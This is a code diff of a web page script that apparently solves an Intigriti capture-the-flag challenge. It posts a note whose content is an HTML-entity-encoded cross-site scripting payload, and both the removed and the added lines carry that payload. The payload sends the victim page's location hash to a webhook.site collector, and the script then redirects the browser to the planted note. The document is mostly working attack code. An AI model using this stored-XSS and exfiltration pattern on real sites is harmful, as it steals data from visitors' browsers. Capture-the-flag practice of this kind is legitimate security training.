@@ -5,21 +5,22 @@
         fetch('https://challenge-0325.intigriti.io/api/post', {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'application/json'
           },
+          credentials: 'include',
           body: JSON.stringify({
             title: 'Leaky Flag',
-            content: '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(document.location.hash))&#x3C;/script&#x3E;',
-            use_password: 'false'
-          }),
-          credentials: 'include'
+            content: '&#x3C;script&#x3E;fetch(\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\' + encodeURIComponent(document.location.hash))&#x3C;/script&#x3E;',
+            use_password: false
+          })
         })
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => {
           window.location.href = `https://challenge-0325.intigriti.io/note/${data.id}`;
         })
-        .catch(error => console.error('Error:', error));
+        .catch(console.error);
       }
+
       createNote();
     </script>
   </body>
